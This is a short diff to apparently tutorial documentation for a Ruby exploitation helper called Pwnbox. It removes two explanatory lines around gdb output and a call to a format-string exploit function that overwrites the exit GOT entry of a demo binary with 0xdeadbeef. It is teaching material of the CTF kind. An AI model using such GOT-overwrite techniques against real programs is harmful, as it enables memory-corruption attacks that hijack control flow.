@@ -45,8 +45,6 @@ int main(int argc, char** argv)
 }
 ```
 
-Get exploit parameters using gdb.
-
 ```shell
 => 0x080484c7 <+74>:    call   0x8048330 <printf@plt>
 (gdb) x/i 0x8048350
@@ -54,8 +52,6 @@ Get exploit parameters using gdb.
 (gdb) x/x $esp
 0xbffff2f0:     0xbffff30c
 ```
-
-exit GOT : 0x804a014, buffer : 0xbffff30c, esp : 0xbffff2e0
 
 ```ruby
 Pwnbox::Pwnable.fsb(0x804a014, 0xbffff30c - 0xbffff2f0, [0xdeadbeef].pack('<I'))
